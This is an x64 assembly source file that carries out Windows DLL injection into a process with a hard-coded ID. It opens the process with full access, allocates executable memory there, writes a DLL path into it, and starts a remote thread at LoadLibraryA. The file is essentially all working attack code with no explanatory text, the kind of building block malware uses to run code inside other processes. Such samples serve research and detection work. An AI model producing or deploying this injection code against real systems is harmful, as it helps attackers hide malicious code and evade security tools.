; windows_injection_createremotethread.asm

extrn ExitProcess :PROC
extrn OpenProcess :PROC
extrn VirtualAllocEx :PROC
extrn WriteProcessMemory :PROC
extrn GetModuleHandleA :PROC
extrn GetProcAddress :PROC
extrn CreateRemoteThread :PROC

.data
    dllPath         DB "C:\Users\User\Desktop\windows_create_dll_64.dll", 0
    sKrnl32         DB "kernel32.dll", 0
    sLoadLib        DB "LoadLibraryA", 0
    PID             DQ 7844

    hProcess        DQ ?
    nSizeDLL        DQ ?
    baseAddr        DQ ?
    hKrnl32Addr     DQ ?
    hLoadLibAddr    DQ ?

.code
Start PROC
    SUB     rsp, 28h

    ; OpenProcess()
    MOV     rcx, 1F0FFFh
    XOR     rdx, rdx
    MOV     r8, PID
    CALL    OpenProcess
    CMP     rax, 0
    JZ      _exit
    MOV     hProcess, rax

    ; VirtualAllocEx()
    SUB     rsp, 28h
    MOV     rcx, hProcess
    XOR     rdx, rdx
    MOV     r8, SIZEOF dllPath
    MOV     r9, 3000h
    MOV     qword ptr [rsp+32], 40h
    CALL    VirtualAllocEx
    ADD     rsp, 28h
    CMP     rax, 0
    JZ      _exit
    MOV     baseAddr, rax

    ; WriteProcessMemory()
    SUB     rsp, 28h
    MOV     rcx, hProcess
    MOV     rdx, baseAddr
    LEA     r8, dllPath
    MOV     r9, SIZEOF dllPath
    XOR     rax, rax
    MOV     qword ptr [rsp+32], rax
    CALL    WriteProcessMemory
    ADD     rsp, 28h
    CMP     rax, 0
    JZ      _exit

    ; GetModuleHandle()
    LEA     rcx, sKrnl32
    CALL    GetModuleHandleA
    CMP     rax, 0
    JZ      _exit
    MOV     hKrnl32Addr, rax

    ; GetProcAddress()
    MOV     rcx, hKrnl32Addr
    LEA     rdx, sLoadLib
    CALL    GetProcAddress
    CMP     rax, 0
    JZ      _exit
    MOV     hLoadLibAddr, rax

    ; CreateRemoteThread()
    SUB     rsp, 38h
    MOV     rcx, hProcess
    XOR     rdx, rdx
    XOR     r8, r8
    MOV     r9, hLoadLibAddr
    MOV     rax, baseAddr
    MOV     qword ptr [rsp+48], 0
    MOV     qword ptr [rsp+40], 0
    MOV     qword ptr [rsp+32], rax
    CALL    CreateRemoteThread
    ADD     rsp, 38h
    CMP     rax, 0
    JZ      _exit

_exit:
    XOR     rcx, rcx
    CALL    ExitProcess
Start ENDP

END
